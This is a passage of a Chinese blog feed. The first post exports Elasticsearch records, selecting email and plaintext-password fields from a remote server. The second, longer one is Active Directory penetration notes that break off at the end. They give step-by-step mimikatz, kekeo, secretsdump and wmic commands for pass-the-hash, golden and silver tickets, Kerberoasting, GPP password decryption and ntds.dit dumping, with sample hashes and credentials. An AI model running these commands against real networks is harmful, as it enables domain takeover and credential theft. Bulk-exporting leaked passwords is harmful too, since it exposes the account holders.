      <url>/2018/03/28/%E6%89%B9%E9%87%8F%E5%AF%BC%E5%87%BAElasticSearch%E6%9F%A5%E8%AF%A2%E7%9A%84%E7%BB%93%E6%9E%9C/</url>
      <content type="html"><![CDATA[<p>…..<br><a id="more"></a></p><p>工具 ： <a href="https://github.com/taraslayshchuk/es2csv" target="_blank" rel="noopener">es2csv</a></p><h2 id="安装python3"><a href="#安装python3" class="headerlink" title="安装python3"></a>安装python3</h2><p>后修改 </p><pre><code>C:\python3\python.exe --&gt; C:\python3\python3.exe</code></pre><h2 id="添加环境变量"><a href="#添加环境变量" class="headerlink" title="添加环境变量"></a>添加环境变量</h2><pre><code>C:\python3\</code></pre><h2 id="安装es2csv所使用的插件"><a href="#安装es2csv所使用的插件" class="headerlink" title="安装es2csv所使用的插件"></a>安装es2csv所使用的插件</h2><p><a href="https://github.com/niltonvolpato/python-progressbar" target="_blank" rel="noopener">python-progressbar</a></p><p><a href="https://pypi.python.org/pypi/unicodecsv/0.14.1" target="_blank" rel="noopener">unicodecsv-0.14.1</a></p><p><a href="https://pypi.python.org/pypi/urllib3" target="_blank" rel="noopener">urllib3-1.22</a></p><p><a href="https://pypi.python.org/pypi/elasticsearch/5.2.0" target="_blank" rel="noopener">elasticsearch-5.2.0</a></p><p>进入到各自的文件夹下 运行：</p><pre><code>python3 setup.py install</code></pre><h2 id="英文系统下-打不了中文"><a href="#英文系统下-打不了中文" class="headerlink" title="英文系统下(打不了中文)"></a>英文系统下(打不了中文)</h2><p>进入<a href="https://sourceforge.net/projects/conemu/files/OldReleases/ConEmuPack/" target="_blank" rel="noopener">ConEmuPack</a>文件夹下，双击ConEmu64.exe运行：</p><pre><code>搜索字符串 ： -q &#39;00&#39;搜索全部索引 ： -i _all搜索需要的字段 ： -f 邮箱-EMAIL 明文密码-PASSWORD保存成csv文件 ： -o file.csv</code></pre><p>cd es2csv文件夾 运行： </p><pre><code>python3 es2csv_new.py -u http://9.9.9.10:9200 -q &#39;xx.cc&#39; -i _all -e -f 邮箱-EMAIL 明文密码-PASSWORD -o file-new.csv -k    Found 1846 results    Run query [#####] [1846/1846] [100%] [0:00:00] [Time: 0:00:00] [ 3.92 kdocs/s]    To csv [######] [614/614] [100%] [0:00:00] [Time: 0:00:00] [ 15.35 klines/s]    DELETE http://9.9.9.10:9200/_search/scroll [status:400 request:0.000s]</code></pre><p>导出数目多于官方规定死的500条，无限制</p>]]></content>
      
      <categories>
          
          <category> 技术相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ElasticSearch </tag>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>域渗透相关</title>
      <link href="/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/"/>
      <url>/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/</url>
      <content type="html"><![CDATA[<p>…..<br><a id="more"></a></p><h2 id="Pass-the-Hash-PTH-hash传递攻击-即-Mimikatz-hash注入"><a href="#Pass-the-Hash-PTH-hash传递攻击-即-Mimikatz-hash注入" class="headerlink" title="Pass the Hash (PTH hash传递攻击, 即 Mimikatz hash注入 )"></a>Pass the Hash (PTH hash传递攻击, 即 Mimikatz hash注入 )</h2><p>在windows系统中,系统通常不会存储用户登录密码,而是存储密码的哈希值. </p><p>在我们远程登录系统的时候,实际上向远程传递的就是密码的hash值。</p><p>当攻击者获取了存储在计算机上的用户名和密码的hash值的时候(PWDUMP7等)</p><p>他虽然不知道密码值,但是仍然可以通过直接连接远程主机,通过传送密码的hash值来达到登录的目的。</p><p>工具: </p><pre><code>a. Metasploit - exploit/windows/smb/psexec (XP,2003)b. xfreerdp (2012r2 http://www.freebuf.com/articles/system/15757.html Hash传递攻击登陆Windows2012远程桌面)    微软在2014年发布了KB2871997和KB2928120两个补丁,用来阻止域内主机本地用户的网络登录,本地用户的PTH方式已经死掉然而 , mimikatz实现了在禁用NTLM的环境下仍然可以远程连接。c.hash injection     mimikatz # privilege::debug    mimikatz # sekurlsa::pth /user:administrator /domain:workgroup /ntlm:d6e1371929886ec1be0b0cf4b101f289 /run:c:\windows\system32\cmd.exe(sekurlsa::pth 中的pth 即Pass the Hash)</code></pre><h2 id="Pass-The-Key-OverPass-the-Hash"><a href="#Pass-The-Key-OverPass-the-Hash" class="headerlink" title="Pass The Key (OverPass-the-Hash)"></a>Pass The Key (OverPass-the-Hash)</h2><p>当系统安装了KB2871997补丁且禁用了NTLM的时候，那我们抓取到的ntlm hash</p><p>也就失去了作用，但是可以通过pass the key的攻击方式获得权限</p><pre><code>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot; 获取用户的aes keymimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:用戶a /domain:test.local /aes256:f74b379b5b422819db694aaf78f49177ed21c98ddad6b0e246a7e17df6d19d5c&quot; 注入aes key</code></pre><p>若dir 查看不了服务器 (测试2008r2域服务器) </p><p>查看mimikatz的相关资料发现如下信息:</p><pre><code>ntlm hash is mandatory on XP/2003/Vista/2008 and before 7/2008r2/8/2012 kb2871997 (AES not available or replaceable) ; AES keys can be replaced only on 8.1/2012r2 or 7/2008r2/8/2012 with kb2871997, in this case you can avoid ntlm hash.</code></pre><p>根据提示，尝试在系统安装补丁kb2871997后继续测试<br>安裝 : <a href="https://www.microsoft.com/en-us/download/details.aspx?id=42765" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=42765</a><br>之后可以用\计算机名的方式通过远程共享查看目标机器(ps:这里必须要使用计算机名进行连接，会爆密码错误。  不要用win10测试，win10机器测试会在一分鐘后重啓 ,)<br>(如果获取的散列是NTLM，则Kerberos凭证加密方法是RC4。如果散列加密方法为AES，则Kerberos票使用AES进行的加密。)</p><h2 id="Pass-the-Ticket-票据传递攻击PtT"><a href="#Pass-the-Ticket-票据传递攻击PtT" class="headerlink" title="Pass the Ticket (票据传递攻击PtT)"></a>Pass the Ticket (票据传递攻击PtT)</h2><p><img src="/2018/02/19/域渗透相关/Kerberos.png" alt="Kerberos.png"></p><p>简义 </p><pre><code>知道用户的ntlm值，由kekeo生成TGT票据，之后导入票据即可</code></pre><p>与PtH情况类似,但PtT使用的是Kerberos票据,而不是NT哈希</p><p><a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos</a></p><p>在微软活动目录中颁发的TGT是可移植的。由于Kerberos的无状态特性,TGT中并没有关于票据来源的标识信息。</p><p>这意味着可以从某台计算机上导出一个有效的TGT,然后导入到该环境中其他的计算机上。</p><p>新导入的票据可以用于域的身份认证,并拥有票据中指定用户的权限来访问网络资源。   </p><p>这种特别的攻击方法被称为”pass-the-ticket”攻击。</p><p><img src="/2018/02/19/域渗透相关/pass-the-ticket.png" alt="pass-the-ticket.png"></p><p>拿到了域控权限,在上面就可以很容易的获得krbtgt的Hash值,再通过mimikatz即可生成任意用户任何权限的Ticket,也就是Golden Ticket</p><p>考虑到mimikatz的pth功能需要本地管理员权限，所以mimikatz也提供了不需要管理员权限的解决方法Pass-The-Ticket</p><p>Pass-The-Ticket需要用到gentilkiwi开源的另一款工具kekeo : <a href="https://github.com/gentilkiwi/kekeo" target="_blank" rel="noopener">https://github.com/gentilkiwi/kekeo</a></p><p>执行后生成票据<a href="mailto:TGT_test1@TEST.LOCA" target="_blank" rel="noopener">TGT_test1@TEST.LOCA</a><a href="mailto:L_krbtgt~test.local@TEST.LOCAL.kirbi" target="_blank" rel="noopener">L_krbtgt~test.local@TEST.LOCAL.kirbi</a> : </p><pre><code>kekeo &quot;tgt::ask /user:test1 /domain:test.local /ntlm:7ECFFFF0C3548187607A14BAD0F88BB1&quot;</code></pre><p>导入票据：</p><pre><code>kekeo &quot;kerberos::ptt TGT_test1@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi&quot;</code></pre><p>以上3种:</p><pre><code>hash传递攻击(PtH):抓住哈希并使用它来访问资源。用户更改帐户密码之前有效。凭证传递攻击(PtT):抓取Kerberos凭证，并且使用它进行访问资源。攻击有效期是在票证有效期之内(一般为7天)。超hash传递攻击(OPtH / PtK):使用密码哈希来获取Kerberos凭证。用户更改帐户密码之前，哈希才有效。</code></pre><h2 id="Golden-Ticket-黄金票据"><a href="#Golden-Ticket-黄金票据" class="headerlink" title="Golden Ticket (黄金票据)"></a>Golden Ticket (黄金票据)</h2><p>简义 : 在拥有普通域用户权限和 krbtgt账号的hash的情况下,获取域管理员权限。</p><p>发生在上面的过程3,可以伪造TGT(前提是获取krbtgt账号的口令散列值(hash))，宣称自己是域内任何账号，包括域管或者不存在的用户。</p><p>由來: </p><pre><code>Kerberos信任及完全依赖于KDC密码,由于Kerberos协议是无状态的,因此密钥分发中心KDC和票据授予服务TGS并没记录以前的交互信息。因此票据授予服务所需使用的全部信息都位于TGT票据中。因为TGT使用krbtgt的密钥加密过,理论上讲网络上只有两方能够解密TGT:             颁发票据的KDC和接受票据并创建访问网络资源的服务票据的票据授予服务TGS。    这种情况让krbtgt成为系统中最重要的密码。最终结果是只要TGT被krbtgt账户密码正确地加密,TGT中的所有信息都是可信的。</code></pre><p>如果攻击者能够攻陷KDC和提取krbtgt散列值(hash)。然后利用这些有限信息,攻击者能够为委托人principal生成任意的TGT。</p><pre><code>1. 首先,黄金票据是全功能的TGT。也就意味着万能票据可用于Kerberos认证的任何服务。票据授予服务盲目地相信TGT中的信息,然后处理TGT并颁发服务票据。内存中插入黄金票据并不需要提升权限。而且默认情况下,黄金票据的有效期是10年。2. 其次,　黄金票据可以用来绕过当前Kerberos有关加密策略的要求。例如,可以使用DES或RC4加密算法创建一个TGT,即使该域明确支持AES,禁止使用DES或RC4。此情况会产生一个有趣的现象: TGT使用DES加密而服务票据使用AES加密。票据授予服务似乎并不担心TGT,也不拒绝异常行为,因为没有机制让票据授予服务报告关于策略的错误。3. 再次,黄金票据并没启用任何高级账户策略的设置。微软添加了一个功能来验证服务票据的请求,以确保已禁用的TGT不能用于获得服务票据。然而,该功能的实现存在问题。只有当TGT的寿命超过20分钟时,票据授予服务才会验证TGT的有效性。如果TGT的寿命低于20分钟,票据授予服务将直接颁发服务票据,而不去验证TGT的有效性,默认情况下服务票据具有10小时的有效期。因为攻击者可以利用Mimikatz工具随心所欲的产生票据,所以攻击者只需清除旧的TGT,再替换为寿命少于20分钟的新票据,轻松突破20分钟的限制条件。4. 最终,黄金票据可以被配置成任意用户和任意组的成员。这也可以创建一个票据,票据中任何用户都可以是任意组的成员。这可以用来绕过文件服务器或其他应用程序上基于用户组的访问限制。黄金票据中的用户和SID不必在活动目录中真实存在。也就意味着可以为域中不存在的用户创建TGT,并仍然可以在TGT生命周期内前20分钟内从票据授予服务获得服务票据。5. 所需条件:     5.1 krbtgt账户的NT-Hash - 该散列值仅位于域控服务器的活动目录中。所以攻击者必须攻陷域控服务器并提权至管理员权限    5.2 域账户名称 - 通常是域管理员&quot;domain admin&quot;    5.3 域名    5.4 域SID - 可以从域用户的SID或通过sysinternal中psGetsid.exe获得6 简单过程:    6.1 清空缓存证书    kerberos::purge  ( or klist purge)    6.2 手动创建了一张域管理的黄金票据    kerberos::golden /admin:administrator /domain:demo.local /sid:S-1-5-21-1239069908-882060383-2558203358 /krbtgt:3f65c6984cbfebdc5f17986d07620afb /ticket:administrator.kirbi.bin    6.3 使用这张票据     kerberos::ptt administrator.kirbi.bin</code></pre><p><img src="/2018/02/19/域渗透相关/Golden_Ticket1.png" alt="Golden_Ticket1"></p><pre><code>    6.4 然后我的低权限本地用户，就被提升到域管理权限    kerberos::list    6.5 利用dcsync功能获取hash,通过DRSR(目录复制服务DRS远程协议)协议，从域控制器获取任何用户的hash    lsadump::dcsync /domain:demo.local /user:testwin10  (administrator / testwin7)</code></pre><p><img src="/2018/02/19/域渗透相关/Golden_Ticket2.png" alt="Golden_Ticket2"></p><h2 id="Silver-Ticket-白银票据"><a href="#Silver-Ticket-白银票据" class="headerlink" title="Silver Ticket (白银票据)"></a>Silver Ticket (白银票据)</h2><p>简义 : 发生在上面的过程5，可以伪造TGS(前提是获取服务账号的口令散列值)，宣称自己是域内任何账号，例如域管。</p><p>Silver Ticket生成时指定了相关的服务名，因此只能用来访问相应的服务，所以局限性比较大，没有golden ticket好用</p><p>所需条件(mimikatz生成silver ticket)</p><pre><code>1. /domain2. /sid            ( S-1-5-21-1239069908-882060383-2558203358-500 注意:不要後面的-500  )3. /target:域控全称4. /service:目标服务器上面的kerberos服务，此处为cifs5. /rc4:域控的计算机账户ntlm hash6. /user:要伪造的用户名(可以不存在也可是存在的)7. mimikatz.exe &quot;kerberos::golden /domain:域 /sid:SID /target:域全称 /service:要访问的服务 /rc4:NTLM /user:silver /ptt&quot;即可生成并导入Silver Ticket</code></pre><p>常用的服务名有以下:</p><pre><code>服务名称                    同时需要的服务WMI                        HOST、RPCSSPowerShell Remoting        HOST、HTTPWinRM                    HOST、HTTPScheduled Tasks            HOSTWindows File Share        CIFSLDAP                    LDAPWindows Remote Server    RPCSS、LDAP、CIFS</code></pre><p>用法</p><pre><code>kerberos::golden /domain:demo.local /sid:S-1-5-21-1239069908-882060383-2558203358 /target:owa2010dc.demo.local /service:cifs /rc4:aac6185241728f7685c8d50c61573b75 /user:silver /ptt(/rc4:aac6185241728f7685c8d50c61573b75 這裏我用的是owa2010dc$机器賬戶的NTLM hash</code></pre><p><img src="/2018/02/19/域渗透相关/Silver_Ticket1.png" alt="Silver_Ticket1"></p><h2 id="Kerberoast-Kerberos-TGS服务票据-Service-Ticket-离线爆破"><a href="#Kerberoast-Kerberos-TGS服务票据-Service-Ticket-离线爆破" class="headerlink" title="Kerberoast (Kerberos TGS服务票据(Service Ticket)离线爆破)"></a>Kerberoast (Kerberos TGS服务票据(Service Ticket)离线爆破)</h2><p>简义 : 发生在上面的过程3,4, 目标的服务账户的服务器主体名称(SPN)请求一个Kerberos服务票据 (TGS) 。</p><p>这里会采用一个有效的用户认证票据(TGT)来请求一个或几个运行在服务器上的目标服务票据。</p><p>域控不会检测用户是否真正连接到了这些资源上(即使用户可能真的有权限访问)。</p><p>域控会在活动目录中查找SPN并且用SPN关联的用户账户把票据进行加密，以此赋予用户访问服务的权限。</p><p>请求的Kerbero服务票据的加密类型是 RC4_HMAC_MD5, 这意味着服务账户的NTLM密码哈希会被用来加密服务票据。</p><p>所以Kerberoast能够通过尝试不同的NTLM哈希来解开kerberos票据，一旦票据被成功解开，它的密码也就到手了。<br>(获得服务票据不需要提权，同时也不会发送数据到目标机器。)</p><pre><code>https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py    python tgsrepcrack.py wordlist.txt sql.kirbi</code></pre><h2 id="Kerberoasting-Kerberoast攻击的另一种姿势"><a href="#Kerberoasting-Kerberoast攻击的另一种姿势" class="headerlink" title="Kerberoasting - Kerberoast攻击的另一种姿势"></a>Kerberoasting - Kerberoast攻击的另一种姿势</h2><p>我们通常不关心基于主机的SPN，因为计算机的机器帐户密码默认是随机的，每30天更换一次。</p><p>但是，请记住，也可以为域用户帐户注册任意的SPN。</p><p>一个常见的例子就是一个服务账户管理着多个MSSQL实例;此用户帐户注册的每个MSSQL实例都有一个&lt;MSSQLSvc/HOST:PORT&gt; 这样的SPN，</p><p>这个SPN存储在用户的serviceprincipalname属性里.如果我们有一个为域用户帐户注册的任意SPN，</p><p>那么该用户帐户的明文密码的NTLM哈希值就将用于创建服务票证    </p><p>注意的是： 任何具有服务主体名称SPN的域用户帐户都可以被该域中任何用户请求该SPN的TGS，</p><p>从而允许攻击者离线破解服务帐户的明文密码！这显然取决于一个可破解的服务帐户明文密码的复杂度</p><p><strong>老套的”Kerberoasting攻击姿势</strong></p><pre><code>给出的利用方法或工具包是使用工具集的组合来请求票证，并从内存中提取(使用Mimikatz)票证，然后将它们转换为可破解的格式。</code></pre><p>一般来说，整个过程如下：</p><pre><code>a. 使用Tim的GetUserSPNS.ps1脚本或者Sean的Find-PSServiceAccounts.ps1脚本或PowerView的&quot;Get-NetUser -SPN&quot;来枚举域帐户的SPN。枚举域帐户的SPN :  &gt; * GetUserSPNS.ps1 - https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1    PS C:\Users\Administrator\Desktop\kerberoast&gt; . .\GetUserSPNs.ps1        ServicePrincipalName : kadmin/changepw        Name                 : krbtgt        SAMAccountName       : krbtgt        MemberOf             : CN=Denied RODC Password Replication Group,CN=Users,DC=demo,DC=local        PasswordLastSet      : 9/13/2016 11:37:59 AM        ServicePrincipalName : test/test        Name                 : testwin10        SAMAccountName       : testwin10        MemberOf             :        PasswordLastSet      : 1/12/2018 3:00:22 PM&gt; * PowerView 的 Get-NetUser -SPN - https://github.com/PowerShellMafia/PowerSploit/blob/5690b09027b53a5932e42399f6943e03fa32e549/Recon/PowerView.ps1#L2087-L2089    PS C:\Users\Administrator\Desktop\PowerSploit\Recon&gt; Get-NetUser -spn        objectsid              : S-1-5-21-1239069908-882060383-2558203358-502        iscriticalsystemobject : True        samaccounttype         : 805306368        objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=demo,DC=local        objectclass            : {top, person, organizationalPerson, user}        logoncount             : 0        lastlogon              : 1/1/1601 8:00:00 AM        serviceprincipalname   : kadmin/changepw        adspath                : LDAP://CN=krbtgt,CN=Users,DC=demo,DC=local        dscorepropagationdata  : {1/12/2018 6:32:42 AM, 9/13/2016 4:06:37 AM, 9/13/2016 3:53:08 AM, 1/1/1601 12:00:00 AM}        distinguishedname      : CN=krbtgt,CN=Users,DC=demo,DC=local        ....</code></pre><p><img src="/2018/02/19/域渗透相关/getspn.png" alt="getspn"></p><pre><code>b. 请求这些特定的SPN的 TGS可以使用Windows内置的工具setspn.exe或者在PowerShell中调用.NET的    System.IdentityModel.Tokens.KerberosRequestorSecurityToken类。c. 使用Mimikatz的kerberos::list/export命令从内存中提取这些票证，并设置可选的base64导出格式。    然后下载票据，或者将base64编码的票证拖到攻击者的机器上进行解码。d. 使用Tim的tgsrepcrack.py开始离线破解密码:    https://raw.githubusercontent.com/nidem/kerberoast/master/tgsrepcrack.py    pip install requests-kerberos,kerberos-sspi    import kerberos 改成 import kerberos_sspi as kerberos        python tgsrepcrack.py dic.txt file.kirbi   或者使用John the Ripper的kirbi2john.py从原始票证中提取可破解的哈希格式：        python kirbi2john.py *.kirbi &gt; johnkirb.txt        john johnkirb.txt --wordlist=dic.txt  e. xan7r给 Tim的工具集增加了一个分支，他添加了一个autokerberoast.ps1脚本，自动化了上述攻击过程:https://raw.githubusercontent.com/xan7r/kerberoast/master/autokerberoast.ps1    此外，@ tifkin_写了一个Go语言版本的TGS爆破器，比原来的Python版本要快一些。</code></pre><h2 id="SYSVOL"><a href="#SYSVOL" class="headerlink" title="SYSVOL"></a>SYSVOL</h2><p>在域环境中修改域机器的本地账户密码是个很麻烦的事情</p><p>但是微软的GPP(组策略偏好)中提供了一个批量修改本地账户的功能，</p><p>可以一次性批量的修改本地账户密码(组策略不仅仅可以用来批量管理密码)。</p><p>但是最初却导致了一个问题，就是域管理员在配置GPP的时候，会在SYSVOL这个文件夹中保存当前GPP配置的xml文件，</p><p>如果管理员在配置的时候填入了密码，其中就包含了加密了的用户密码(SYSVOL是一个存储域公共文件服务器副本的共享文件夹，</p><p>所有的认证用户都可以读取。SYSVOL包括登录脚本，组策略数据，以及其他域控所需要的域数据，这是因为SYSVOL能在所有域控里进行自动同步和共享。)</p><p>一般sysvol文件的位置是 :</p><pre><code>\\&lt;DOMAIN&gt;\\SYSVOL\\&lt;DOMAIN&gt;\\Policies\\</code></pre><p>其中的groups.xml(Services.xml、ScheduledTasks.xml、Printers.xml、Drives.xml、DataSources.xml)就可能保存了加密后的本地管理账户密码</p><p>(ps:这些文件中并不一定存在密码，因为只有当管理员在配置的时候，在界面的密码框中输入密码之后才会保存(設置計劃任務))</p><p>我们可以通过这个powershell的脚本进行解密Get-GPPPassword.ps1</p><pre><code>(https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1). .\Get-GPPPassword.ps1Get-GPPPassword同样，我们也可以使用Get-GPPPassword.ps1这个脚本在域内自动搜索所有的sysvol中保存的密码并自动解密</code></pre><p>若获取不到:</p><pre><code>a. 使用了LAPS批量管理域内主机本地管理员帐户 (使用ldapsearch来dump域中的LAPS密码 https://www.anquanke.com/post/id/86502)    即 Local Administrator Password Solution : LAPS最大的优点是能够确保每台域内主机有不同的密码，并且定期更换。b. 域控安装补丁KB2962486    这个补丁禁止在组策略配置中填入密码c. 目标不在组策略中使用域控密码d. 设置了共享文件夹\SYSVOL的访问权限</code></pre><h2 id="ntds-dit-活动目录的数据库文件"><a href="#ntds-dit-活动目录的数据库文件" class="headerlink" title="ntds.dit (活动目录的数据库文件)"></a>ntds.dit (活动目录的数据库文件)</h2><p>包含有关活动目录域中所有对象的所有信息 及 所有域用户和计算机帐户的密码哈希值。</p><p>域控制器(DC)上的ntds.dit文件只能由可以登录到DC的用户访问 。</p><p>这些组可以默认登录到域控制器:</p><pre><code>    Enterprise Admins (目录林管理员组)    Domain Admins(域管理员组)    Administrators(管理员组)    Backup Operators(备份操作成员)    Account Operators(账户管理组)    Print Operators(打印机操作组)</code></pre><p>不能登录到域控制器可能 : </p><pre><code>a. 限制了有权登录到域控制器的组/帐户。b. 限制了具有完整活动目录权限的组/帐户，特别是服务帐户。</code></pre><p>若帐户登录了域控制器，首先把所有的登录凭证全部获取到本地:</p><pre><code>1. MIMIKATZ从域控上面抓取到所有账户信息:    mimikatz # lsadump::lsa /inject exit    or 保存到mimikatz.log:    mimikatz # log    mimikatz # privilege::debug    mimikatz # lsadump::lsa /inject    ![mimikatz-lsa](域渗透相关/mimikatz-lsa.png)2.使用MIMIKATZ转储LSASS内存(获取域管理员凭据)    mimikatz # sekurlsa::minidump c:\temp\lsass.dmp    mimikatz # sekurlsa::logonpasswords3. 使用任务管理器转储LSASS内存(获取域管理员凭据)    一旦LSASS被转储，mimikatz就可以对lsass.dmp进行提取    右鍵lsass.exe : Create Dump File4. 用NTDSUTIL创建媒体安装集(IFM) (用于抓取NTDS.DIT文件)    NTDSUtil一个本地运行的针对活动目录数据库(ntds.dit)的命令，并且允许为DCPromo准备IFM集。    IFM是用于DCPromo命令中”从媒体安装”这一过程的，所以，在配置域控时就不需要通过网络从其他域控拷贝数据。    并且也会在c:/temp目录下生成的一份NTDS.dit附件。        ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:\windows\temp\temp&quot; q q    創建了temp目錄，下面会生成 ntds.dit 和 SYSTEM / SECURITY5. 从NTDS.DIT文件(和注册表系统配置单元)转储活动目录域凭据    需要 ntds.dit 和 system.hive (由第4步得到)    https://github.com/CoreSecurity/impacket/blob/master/examples/secretsdump.py (only linux):     -&gt; python secretsdump.py -ntds /root/Desktop/temp/Active Directory/ntds.dit -system /root/Desktop/temp/registry/SYSTEM LOCAL     -&gt;         demo.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::        OWA2010DC$:1000:aad3b435b51404eeaad3b435b51404ee:aac6185241728f7685c8d50c61573b75:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3f65c6984cbfebdc5f17986d07620afb:::OWA2010$:1103:aad3b435b51404eeaad3b435b51404ee:d51220f5659cd982fb3fbe4169093181:::or -&gt; https://github.com/zcgonvh/NTDSDumpEx/releases    NTDSDumpEx.exe -d ntds.dit -o hash.txt -s system.hiv     进一步从NTDS.DIT获取详细的信息:        https://github.com/libyal/libesedb/releases        $ ./configure$ make        $ sudo make install$ sudo ldconfig        root@kali2:~/Desktop/temp# /usr/local/bin/esedbexport -m tables &quot;/root/Desktop/temp/Active Directory/ntds.dit&quot;          (ntds.dit中提取出表，20分鐘，两个重要的表为:datatable以及link_table，他们都会被存放在./ntds.dit.export/文件夹中.)    使用ntdsxtract提取域中信息，一旦表被提取出来，很多python工具可以将这些表中的信息进一步提取，比如ntdsxtract就可以完美进行。        https://github.com/csababarta/ntdsxtract.git        root@kali2:~/Desktop/ntdsxtract-master# python dsusers.py /root/Desktop/temp/ntds.dit.export/datatable.3 /root/Desktop/temp/ntds.dit.export/link_table.5 output --syshive /root/Desktop/temp/registry/SYSTEM --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout |tee all_user_info.txt        root@kali2:~/Desktop/ntdsxtract-master# python dscomputers.py /root/Desktop/temp/ntds.dit.export/datatable.3 computer_output --csvoutfile all_computers.csv        ![mimikatz-lsa](域渗透相关/libesedb__ntdsxtract__ntds.dit.png)6. 可创建和使用GOLDEN TICKET7. 卷影复制(VSS)    ntds.dit我们是没法直接进行复制拷贝的，会提示文件已被占用，这个时候我们可以通过windows提供的卷影复制功能来复制被进程占用的文件(xp和server 2003以上都存在此功能)    1.wmic /node:AD /user:PENTEST\Administrator /password:123qwe!@# process call create &quot;cmd /c vssadmin create shadow /for=c: 2&gt;&amp;1 &gt; c:vss.log&quot;    2.wmic /node:AD /user:PENTEST\Administrator /password:123qwe!@# process call create &quot;cmd /c copy 卷影ID/Windows/NTDS/NTDS.dit C:/windows/temp/NTDS.dit 2&gt;&amp;1&quot;8. 其他 - 转储活动目录数据库(ntds.dit)凭证的方法总结    How Attackers Dump Active Directory Database Credentials        https://adsecurity.org/?p=2398    [译]转储活动目录数据库凭证的方法总结         http://drops.xmd5.com/static/drops/pentesting-12020.html        之前两篇关于如何转储 AD 数据库凭证的文章：             a. 攻击者如何从一个域控制器中读取活动目录数据库(NTDS.DIT)(https://adsecurity.org/?p=451)            b. 在 Active Directory 域中获得管理员权限的攻击方法(https://adsecurity.org/?p=2362  [译]https://xianzhi.aliyun.com/forum/topic/115)8-0x00 远程执行命令方式    有几种不同的方式可以在域控制器上远程执行命令,假设它们已经有了相应的执行权限。最可靠的远程执行方法包括两种 PowerShell(利用 WinRM )和 WMI。    WMI    Wmic /node:COMPUTER/user:DOMAIN\USER /password:PASSWORD process call create &quot;COMMAND&quot;    PowerShell (WMI)    Invoke-WMIMethod -Class Win32_Process -Name Create –ArgumentList $COMMAND –ComputerName $COMPUTER -Credential $CRED    WinRM    winrs –r:COMPUTER COMMAND    远程 PowerShell    Invoke-Command –computername $COMPUTER -command { $COMMAND}    New-PSSession -Name PSCOMPUTER –ComputerName $COMPUTER; Enter-PSSession -Name PSCOMPUTER8-0x01 使用 NTDSUtil 创建 IFM 抓取 DC 本地的Ntds.dit文件 (VSS 卷影复制)    NTDSUtil一个本地运行的针对活动目录数据库(ntds.dit)的命令,并且允许为DCPromo准备IFM集。    IFM是用于DCPromo命令中&quot;从媒体安装&quot;这一过程的,所以,在配置域控时就不需要通过网络从其他域控拷贝数据。    IFM集,并且也会在c:/temp目录下生成的一份NTDS.dit附件。        ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:\windows\temp\temp&quot; q q    创建了temp目录,下面会生成 ntds.dit 和 SYSTEM / SECURITY    这个命令也可以通过 WMI 或 PowerShell 远程执行。8-0x02 使用 VSS 卷影副本远程读取 ntds.dit(通过 WMI or PowerShell 远程管理)    ntds.dit我们是没法直接进行复制拷贝的,会提示文件已被占用,这个时候我们可以通过windows提供的卷影复制功能来复制被进程占用的文件(xp和server 2003以上都存在此功能)    a. wmic /node:AD /user:PENTEST\Administrator /password:123qwe!@# process call create &quot;cmd /c vssadmin create shadow /for=c: 2&gt;&amp;1 &gt; c:\vss.log&quot;    当 VSS 快照完成后,我们就可以从 VSS 中将 NTDS.dit 文件和 注册表中的 System hive 复制到域控制器的 C 盘中。    b1. wmic /node:AD /user:PENTEST\Administrator /password:123qwe!@# process call create &quot;cmd /c copy 卷影ID\Windows\NTDS\NTDS.dit C:\windows\temp\NTDS.dit 2&gt;&amp;1 &gt; c:\vss2.log&quot;    b2. wmic /node:AD /user:PENTEST\Administrator /password:123qwe!@# process call create &quot;cmd /c copy 卷影ID\Windows\System32\config\SYSTEM C:\windows\temp\SYSTEM.hive 2&gt;&amp;1 &gt; c:\vss2.log&quot;    之后就可以将域控制器中 c:\\temp 目录的文件复制到本地的计算机中。    copy /z \\demo.local\c$\windows\temp\NTDS.dit c:\temp    copy /z \\demo.local\c$\windows\temp\SYSTEM.hive c:\temp    较新版本的 Windows 中 WMIC 已经有些过时了。 PowerShell 提供了 Invoke-WMIMethod cmdlet 可以执行相同的功能。8-0x03 使用 PowerSploit 的 Invoke-NinjaCopy 远程读取 ntds.dit(需要目标 DC 启用 PowerShell 远程管理)    Joe Bialek (@JosephBialek)在他的博客中写了如下关于 Invoke-NinjaCopy 的信息。    目前,已有好几种方法可以转储 Active Directory 和本地密码的 HASH。    不过直到最近,我发现目前获取 HASH 的技术,需 要依赖于注入代码到 LSASS 进程或使用 VSS ,以获得含有 HASH 文件的副本。    Invoke-NinjaCopy 的 PowerShell 脚本,支持任何文件(包括NTDS.DIT)的复制,    无需启动可疑的服务,无需注入代码到进程中,或者提升到 SYSTEM 权限。    该脚本可以打开整个卷(如C:)的读取句柄并解析 NTFS 结构,从而从一个 NTFS 卷复制文件。此操作需要目标服务器的管理员权限。利用此脚本可以绕过以下保护措施:    一个已被进程打开且不能被其他进程操作的文件,如 Ntds.dit 文件或注册表中的 SYSTEM hive 配置文件。    已被设置 SACL 标志的文件,在打开此类文件时,会有提醒(此脚本没有使用 Win32 API 打开文件,因此Windows 没有反应)。    绕过 DACL ,例如 DACL 只允许 SYSTEM 权限打开一个文件。    如果指定了 LocalDestination 